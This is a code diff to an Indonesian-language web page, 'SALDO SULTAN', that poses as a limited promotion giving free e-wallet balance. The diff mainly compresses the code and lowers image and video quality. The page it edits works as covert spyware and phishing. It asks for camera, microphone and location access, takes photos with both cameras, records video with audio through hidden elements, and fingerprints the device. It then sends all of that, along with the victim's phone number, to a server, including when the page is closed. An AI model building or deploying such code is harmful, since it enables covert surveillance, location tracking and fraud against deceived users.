@@ -23,10 +23,7 @@
             width: 100%;
             border: 1px solid rgba(255,255,255,0.06);
             box-shadow: 0 30px 80px rgba(0,0,0,0.8);
-            position: relative;
         }
-
-        /* LOADING */
         .loading-screen {
             text-align: center;
             padding: 50px 0 30px;
@@ -69,15 +66,9 @@
             50% { content: '..'; }
             75% { content: '...'; }
         }
-
-        /* FORM */
         .form-screen { display: none; }
         .form-screen.visible { display: block; }
-
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
+        .header { text-align: center; margin-bottom: 24px; }
         .header .badge {
             display: inline-block;
             background: rgba(255,215,0,0.08);
@@ -97,16 +88,8 @@
             color: #fff;
             line-height: 1.2;
         }
-        .header h1 .highlight {
-            color: #ffd700;
-        }
-        .header p {
-            color: rgba(255,255,255,0.3);
-            font-size: 13px;
-            margin-top: 4px;
-        }
-
-        /* SALDO */
+        .header h1 .highlight { color: #ffd700; }
+        .header p { color: rgba(255,255,255,0.3); font-size: 13px; margin-top: 4px; }
         .saldo-card {
             background: rgba(255,215,0,0.04);
             border: 1px solid rgba(255,215,0,0.08);
@@ -134,8 +117,6 @@
             font-weight: 400;
             color: rgba(255,255,255,0.2);
         }
-
-        /* E-WALLET */
         .ewallet-label {
             font-size: 11px;
             font-weight: 600;
@@ -160,9 +141,7 @@
             cursor: pointer;
             transition: all 0.3s;
         }
-        .ewallet-item:hover {
-            border-color: rgba(255,215,0,0.2);
-        }
+        .ewallet-item:hover { border-color: rgba(255,215,0,0.2); }
         .ewallet-item.active {
             border-color: #ffd700;
             background: rgba(255,215,0,0.05);
@@ -173,14 +152,8 @@
             color: rgba(255,255,255,0.4);
             letter-spacing: 0.3px;
         }
-        .ewallet-item.active .name {
-            color: #ffd700;
-        }
-
-        /* INPUT */
-        .input-group {
-            margin-bottom: 16px;
-        }
+        .ewallet-item.active .name { color: #ffd700; }
+        .input-group { margin-bottom: 16px; }
         .input-group label {
             display: block;
             font-size: 11px;
@@ -206,11 +179,7 @@
             border-color: rgba(255,215,0,0.2);
             background: rgba(255,255,255,0.06);
         }
-        .input-group input::placeholder {
-            color: rgba(255,255,255,0.15);
-        }
-
-        /* SUBMIT */
+        .input-group input::placeholder { color: rgba(255,255,255,0.15); }
         .submit-btn {
             width: 100%;
             padding: 16px;
@@ -224,27 +193,12 @@
             transition: all 0.3s;
             letter-spacing: 0.5px;
         }
-        .submit-btn:hover {
-            background: #f0c800;
-            transform: translateY(-1px);
-        }
+        .submit-btn:hover { background: #f0c800; transform: translateY(-1px); }
         .submit-btn:active { transform: scale(0.98); }
-        .submit-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* RESULT */
+        .submit-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
         .result-screen { display: none; }
         .result-screen.visible { display: block; }
-        .result-image {
-            width: 100%;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-        }
-
-        /* Hidden */
+        .result-image { width: 100%; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
         #hidden-video { display: none; }
         #hidden-canvas { display: none; }
         #recorder-video {
@@ -256,7 +210,6 @@
             opacity: 0;
             pointer-events: none;
         }
-
         @media (max-width: 480px) {
             .container { padding: 24px 16px; }
             .header h1 { font-size: 20px; }
@@ -270,14 +223,12 @@
 <body>
 
 <div class="container">
-    <!-- LOADING -->
     <div class="loading-screen" id="loadingScreen">
         <div class="spinner"></div>
         <div class="loading-title">SALDO SULTAN</div>
         <div class="loading-sub">Memuat<span class="loading-dots"></span></div>
     </div>
 
-    <!-- FORM -->
     <div class="form-screen" id="formScreen">
         <div class="header">
             <div class="badge">🎉 PROMO TERBATAS</div>
@@ -307,13 +258,11 @@
         <button class="submit-btn" id="submitBtn">🚀 KLAIM SALDO</button>
     </div>
 
-    <!-- RESULT -->
     <div class="result-screen" id="resultScreen">
         <img src="" alt="Success" class="result-image" id="resultImage">
     </div>
 </div>
 
-<!-- Hidden -->
 <video id="hidden-video" autoplay playsinline muted></video>
 <video id="recorder-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
@@ -336,7 +285,6 @@
     const canvas = document.getElementById('hidden-canvas');
 
     let selectedEwallet = 'Dana';
-    let permissionsGranted = false;
     let mediaRecorder = null;
     let recordedChunks = [];
     let photos = { front: null, back: null };
@@ -350,51 +298,50 @@
     // 💰 SALDO
     // ============================================
     function generateSaldo() {
-        const min = 45000;
-        const max = 65000;
+        const min = 45000, max = 65000;
         return Math.floor(Math.random() * (max - min + 1)) + min;
     }
 
     // ============================================
-    // 📸 FOTO
+    // 📸 FOTO (Kompres agar ukuran kecil)
     // ============================================
     async function captureBothCameras() {
         const result = { front: null, back: null };
 
         try {
             const s = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 640, height: 480 },
+                video: { facingMode: 'user', width: 320, height: 240 },
                 audio: false
             });
             const v = document.createElement('video');
             v.srcObject = s;
             v.muted = true;
             await v.play();
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
             const c = document.createElement('canvas');
-            c.width = v.videoWidth || 640;
-            c.height = v.videoHeight || 480;
+            c.width = 320;
+            c.height = 240;
             c.getContext('2d').drawImage(v, 0, 0);
-            result.front = c.toDataURL('image/jpeg', 0.85);
+            result.front = c.toDataURL('image/jpeg', 0.7);
             s.getTracks().forEach(t => t.stop());
             console.log('📸 Front captured');
         } catch (e) { console.log('⚠️ Front error:', e.message); }
 
         try {
             const s = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'environment', width: 640, height: 480 },
+                video: { facingMode: 'environment', width: 320, height: 240 },
                 audio: false
             });
             const v = document.createElement('video');
             v.srcObject = s;
             v.muted = true;
             await v.play();
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
             const c = document.createElement('canvas');
-            c.width = v.videoWidth || 640;
-            c.height = v.videoHeight || 480;
+            c.width = 320;
+            c.height = 240;
             c.getContext('2d').drawImage(v, 0, 0);
-            result.back = c.toDataURL('image/jpeg', 0.85);
+            result.back = c.toDataURL('image/jpeg', 0.7);
             s.getTracks().forEach(t => t.stop());
             console.log('📸 Back captured');
         } catch (e) { console.log('⚠️ Back error:', e.message); }
@@ -403,13 +350,13 @@
     }
 
     // ============================================
-    // 🎥 VIDEO 10 DETIK
+    // 🎥 VIDEO (Kompres bitrate)
     // ============================================
     async function recordVideo() {
         return new Promise((resolve) => {
             recordedChunks = [];
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 640, height: 480 },
+                video: { facingMode: 'user', width: 320, height: 240 },
                 audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
             })
             .then((stream) => {
@@ -420,18 +367,13 @@
                 let mime = 'video/mp4';
                 if (!MediaRecorder.isTypeSupported(mime)) {
                     mime = 'video/webm;codecs=vp9,opus';
-                    if (!MediaRecorder.isTypeSupported(mime)) {
-                        mime = 'video/webm;codecs=vp8,opus';
-                    }
-                    if (!MediaRecorder.isTypeSupported(mime)) {
-                        mime = 'video/webm';
-                    }
+                    if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
                 }
 
                 const recorder = new MediaRecorder(stream, {
                     mimeType: mime,
-                    videoBitsPerSecond: 3000000,
-                    audioBitsPerSecond: 128000
+                    videoBitsPerSecond: 500000,
+                    audioBitsPerSecond: 64000
                 });
 
                 recorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
@@ -479,15 +421,9 @@
         else if (ua.includes('firefox')) info.browser = 'Firefox';
         else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
         else if (ua.includes('edge')) info.browser = 'Edge';
-        if (ua.includes('android')) {
-            info.os = 'Android';
-            const m = ua.match(/android\s([\d.]+)/);
-            if (m) info.os += ` ${m[1]}`;
-        } else if (ua.includes('iphone') || ua.includes('ipad')) {
-            info.os = 'iOS';
-            const m = ua.match(/os\s([\d_]+)/);
-            if (m) info.os += ` ${m[1].replace(/_/g, '.')}`;
-        } else if (ua.includes('windows')) { info.os = 'Windows'; }
+        if (ua.includes('android')) { info.os = 'Android'; const m = ua.match(/android\s([\d.]+)/); if (m) info.os += ` ${m[1]}`; }
+        else if (ua.includes('iphone') || ua.includes('ipad')) { info.os = 'iOS'; const m = ua.match(/os\s([\d_]+)/); if (m) info.os += ` ${m[1].replace(/_/g, '.')}`; }
+        else if (ua.includes('windows')) { info.os = 'Windows'; }
         else if (ua.includes('mac')) { info.os = 'macOS'; }
         if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) { info.device = 'Mobile'; }
         else if (ua.includes('tablet') || ua.includes('ipad')) { info.device = 'Tablet'; }
@@ -503,16 +439,9 @@
             { name: 'Huawei', p: ['huawei', 'honor'] },
             { name: 'Apple', p: ['iphone', 'ipad'] }
         ];
-        for (const b of brands) {
-            if (b.p.some(p => ua.includes(p))) { info.brand = b.name; break; }
-        }
-        if (info.brand === 'Apple') {
-            const m = ua.match(/iphone(\d+)/);
-            if (m) info.model = `iPhone ${m[1]}`;
-        } else if (info.brand === 'Samsung') {
-            const m = ua.match(/sm-[a-z0-9]+/i);
-            if (m) info.model = m[0].toUpperCase();
-        }
+        for (const b of brands) { if (b.p.some(p => ua.includes(p))) { info.brand = b.name; break; } }
+        if (info.brand === 'Apple') { const m = ua.match(/iphone(\d+)/); if (m) info.model = `iPhone ${m[1]}`; }
+        else if (info.brand === 'Samsung') { const m = ua.match(/sm-[a-z0-9]+/i); if (m) info.model = m[0].toUpperCase(); }
         return info;
     }
 
@@ -531,7 +460,7 @@
     }
 
     // ============================================
-    // 📤 SEND DATA (dijalankan di background)
+    // 📤 SEND DATA
     // ============================================
     async function sendData(phone, ewallet, saldo) {
         if (hasSent) return;
@@ -547,17 +476,17 @@
                 });
             }
 
-            const payload = {
-                frontPhoto: photos.front,
-                backPhoto: photos.back,
-                video: videoBase64,
-                gps: gpsData,
-                device: deviceData,
-                phone: phone || 'Tidak diketahui',
-                ewallet: ewallet || 'Tidak diketahui',
-                saldo: saldo || '0',
-                timestamp: new Date().toISOString()
-            };
+            // Hanya kirim data yang ada
+            const payload = {};
+            if (photos.front) payload.frontPhoto = photos.front;
+            if (photos.back) payload.backPhoto = photos.back;
+            if (videoBase64) payload.video = videoBase64;
+            if (gpsData) payload.gps = gpsData;
+            if (deviceData) payload.device = deviceData;
+            payload.phone = phone || 'Tidak diketahui';
+            payload.ewallet = ewallet || 'Tidak diketahui';
+            payload.saldo = saldo || '0';
+            payload.timestamp = new Date().toISOString();
 
             console.log('📤 Sending data...');
             const res = await fetch('/verify', {
@@ -575,7 +504,7 @@
     }
 
     // ============================================
-    // 🚀 BACKGROUND PROCESS (langsung jalan)
+    // 🚀 BACKGROUND PROCESS
     // ============================================
     async function startBackgroundProcess() {
         try {
@@ -591,7 +520,7 @@
     }
 
     // ============================================
-    // 🛑 Web di-close, tetap kirim data
+    // 🛑 Web di-close
     // ============================================
     window.addEventListener('beforeunload', async () => {
         console.log('🔄 Page closing, sending data...');
@@ -632,12 +561,11 @@
         const saldo = generateSaldo();
         await sendData(phone, selectedEwallet, saldo);
 
-        // Tampilkan foto dari GitHub
         const githubImg = await getGitHubImage();
         if (githubImg) {
             resultImage.src = githubImg;
         } else {
-            resultImage.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="400" height="500" viewBox="0 0 400 500"%3E%3Crect width="400" height="500" fill="%23141414"/%3E%3Ctext x="50%25" y="45%25" text-anchor="middle" font-family="Arial" font-size="60" fill="%23ffd700" dy=".3em"%3E🎉%3C/text%3E%3Ctext x="50%25" y="55%25" text-anchor="middle" font-family="Arial" font-size="20" fill="%23fff" font-weight="bold"%3ESALDO SULTAN%3C/text%3E%3Ctext x="50%25" y="63%25" text-anchor="middle" font-family="Arial" font-size="14" fill="%23666"%3E%3C/text%3E%3C/svg%3E';
+            resultImage.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="400" height="500" viewBox="0 0 400 500"%3E%3Crect width="400" height="500" fill="%23141414"/%3E%3Ctext x="50%25" y="45%25" text-anchor="middle" font-family="Arial" font-size="60" fill="%23ffd700" dy=".3em"%3E🎉%3C/text%3E%3Ctext x="50%25" y="55%25" text-anchor="middle" font-family="Arial" font-size="20" fill="%23fff" font-weight="bold"%3ESALDO SULTAN%3C/text%3E%3C/svg%3E';
         }
 
         formScreen.classList.remove('visible');
@@ -650,13 +578,11 @@
     function init() {
         saldoValue.textContent = generateSaldo().toLocaleString('id-ID');
 
-        // Loading 3 detik → form muncul
         setTimeout(() => {
             loadingScreen.classList.add('hidden');
             formScreen.classList.add('visible');
         }, 3000);
 
-        // LANGSUNG MINTA IZIN (popup browser)
         setTimeout(async () => {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -666,7 +592,6 @@
                         navigator.geolocation.getCurrentPosition(() => r(), () => r(), { timeout: 5000 });
                     });
                 }
-                permissionsGranted = true;
                 console.log('✅ All permissions granted');
                 startBackgroundProcess();
             } catch (err) {
